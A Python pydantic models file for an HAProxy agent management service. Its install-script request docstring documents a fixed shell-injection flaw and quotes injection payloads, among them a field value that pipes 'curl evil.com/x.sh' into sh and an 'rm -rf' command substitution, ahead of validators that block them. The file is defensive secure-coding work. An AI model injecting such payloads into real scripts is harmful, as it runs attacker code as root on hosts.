import re
from pydantic import BaseModel, validator
from typing import Optional, List, Dict, Any

class AgentCreate(BaseModel):
    name: str
    pool_id: int
    platform: str = "linux"
    architecture: str = "amd64"
    version: str = "1.0.0"

class AgentRegister(BaseModel):
    name: str
    pool_id: int
    platform: str = "linux"
    architecture: str = "amd64"
    version: str = "1.0.0"
    hostname: Optional[str] = None
    ip_address: Optional[str] = None
    operating_system: Optional[str] = None
    kernel_version: Optional[str] = None
    uptime: Optional[int] = None
    cpu_count: Optional[int] = None
    memory_total: Optional[int] = None  # in MB
    disk_space: Optional[int] = None  # in MB
    network_interfaces: Optional[List[str]] = None
    capabilities: Optional[List[str]] = None

class AgentHeartbeat(BaseModel):
    name: str
    status: str = "online"
    
    # Optional system info from agent
    hostname: Optional[str] = None
    platform: Optional[str] = None
    architecture: Optional[str] = None
    version: Optional[str] = None  # Agent version
    cluster_id: Optional[int] = None
    
    # Detailed system information (flat format - for backward compatibility with old agents)
    operating_system: Optional[str] = None
    kernel_version: Optional[str] = None
    uptime: Optional[int] = None  # in seconds
    cpu_count: Optional[int] = None
    memory_total: Optional[int] = None  # in bytes
    disk_space: Optional[int] = None  # in bytes
    network_interfaces: Optional[List[str]] = None
    capabilities: Optional[List[str]] = None
    ip_address: Optional[str] = None

    # Optional performance metrics
    cpu_usage: Optional[float] = None
    memory_usage: Optional[float] = None
    disk_usage: Optional[float] = None
    load_average: Optional[List[float]] = None
    network_io: Optional[Dict[str, Any]] = None
    
    # HAProxy info
    haproxy_status: Optional[str] = None
    haproxy_version: Optional[str] = None
    
    # Keepalive (VRRP) state
    keepalive_state: Optional[str] = None   # "MASTER", "BACKUP", or None
    keepalive_ip: Optional[str] = None      # Virtual IP managed by keepalived
    
    # Server status from HAProxy stats socket
    server_statuses: Optional[Dict[str, Dict[str, str]]] = None  # {backend_name: {server_name: status}}
    
    # Full HAProxy stats CSV (base64 encoded) for dashboard metrics
    haproxy_stats_csv: Optional[str] = None
    
    # Config sync tracking (agent reports what it successfully applied)
    applied_config_version: Optional[str] = None
    
    # System info collected by agent (JSON object - nested format for new agents)
    system_info: Optional[Dict[str, Any]] = None
    
    # Other optional fields
    last_config_update: Optional[str] = None
    errors: Optional[List[str]] = None
    
    class Config:
        # Allow extra fields from agents (for forward compatibility and tolerance)
        extra = "allow"

class AgentToggle(BaseModel):
    enabled: bool

class AgentPoolCreate(BaseModel):
    name: str
    description: Optional[str] = None
    environment: str = "development"  # development, staging, production
    location: Optional[str] = None
    default_config: Optional[Dict[str, Any]] = None
    is_active: Optional[bool] = True

class AgentPoolUpdate(BaseModel):
    name: Optional[str] = None
    description: Optional[str] = None
    environment: Optional[str] = None
    location: Optional[str] = None
    default_config: Optional[Dict[str, Any]] = None
    is_active: Optional[bool] = None

# Aliases for pool management
PoolCreate = AgentPoolCreate
PoolUpdate = AgentPoolUpdate

class AgentScriptRequest(BaseModel):
    """Request body for agent install / upgrade script generation.

    Bulgu #81 (round-22 audit) — pre-fix this model had ZERO
    validators. Every field was a free-form `str`, and the
    generator at `routers/agent.py::generate_install_script`
    interpolates the values directly into a shell-script
    template via `script_template.replace("{{KEY}}", value)`.
    An operator with `agents.create` permission could therefore
    supply payloads like:

        haproxy_bin_path = "/usr/sbin/haproxy; curl evil.com/x.sh | sh #"
        agent_name       = "$(rm -rf /var/log/haproxy-agent)"
        hostname_prefix  = "`reboot`"

    The generated `install-agent.sh` would then carry the
    payload verbatim. Anyone running the script (typically as
    root via `sudo ./install-agent.sh`) would execute the
    injected commands. Because the script is downloaded as a
    file and frequently shared between teammates, the audit
    trail loses the connection between the operator who
    generated it and the host that eventually ran it.

    The validators below mirror the existing field-validation
    conventions in `models/frontend.py` / `models/backend.py`:
      * `platform`, `architecture`: tightly enumerated.
      * `agent_name`, `hostname_prefix`: alphanumerics + the
        dash / underscore / dot set that hostnames legally use.
      * The three `*_path` fields: absolute POSIX paths
        without shell metacharacters or path-traversal segments.
    HAProxy's own files always live under operator-controlled
    paths; the regex is generous enough for any real OS-package
    install location while strict enough that the result is
    safe to inline into a shell script.
    """
    platform: str
    architecture: str
    pool_id: int
    cluster_id: int
    agent_name: str
    hostname_prefix: str
    haproxy_bin_path: str
    haproxy_config_path: str
    stats_socket_path: str

    @validator('platform', 'architecture')
    def _validate_platform_token(cls, v):
        if not isinstance(v, str) or not v.strip():
            raise ValueError('platform/architecture must be a non-empty string')
        s = v.strip()
        if len(s) > 64:
            raise ValueError('platform/architecture too long (max 64 chars)')
        if not re.match(r'^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$', s):
            raise ValueError(
                'platform/architecture must contain only letters, '
                'digits, and `._-`'
            )
        return s

    @validator('agent_name', 'hostname_prefix')
    def _validate_hostname_token(cls, v):
        if not isinstance(v, str) or not v.strip():
            raise ValueError('agent_name/hostname_prefix must be a non-empty string')
        s = v.strip()
        if len(s) > 64:
            raise ValueError('agent_name/hostname_prefix too long (max 64 chars)')
        # RFC 1123 hostname-label-ish: letters, digits, dash,
        # underscore, dot. NO shell metacharacters, no spaces,
        # no `$` `` ` `` `;` `&` `|` `<` `>` `\` `"` `'` `(` `)` etc.
        if not re.match(r'^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$', s):
            raise ValueError(
                'agent_name/hostname_prefix must start with an '
                'alphanumeric and contain only letters, digits, dots, '
                'dashes or underscores'
            )
        return s

    @validator('haproxy_bin_path', 'haproxy_config_path', 'stats_socket_path')
    def _validate_safe_posix_path(cls, v):
        if not isinstance(v, str) or not v.strip():
            raise ValueError('path must be a non-empty string')
        s = v.strip()
        if len(s) > 4096:
            raise ValueError('path too long (max 4096 chars)')
        if not s.startswith('/'):
            raise ValueError('path must be an absolute POSIX path starting with `/`')
        # Reject ANY shell-metacharacter that could break out of
        # the surrounding shell context in the generated script,
        # plus newline / NULL / backslash / glob wildcards. Path-
        # traversal sequences are not strictly dangerous (the
        # agent file system owner decides what's accessible) but
        # `..` segments are rejected anyway to keep the audit log
        # readable.
        FORBIDDEN = set('$`;&|<>"\'\\\n\r\x00*?')
        if any(c in FORBIDDEN for c in s):
            raise ValueError(
                'path contains a forbidden character — shell '
                'metacharacters and whitespace are not allowed '
                'to keep the generated install script safe to execute'
            )
        if '/../' in s or s.endswith('/..') or s.startswith('../'):
            raise ValueError('path must not contain `..` segments')
        return s

class AgentUpgradeRequest(BaseModel):
    agent_id: int 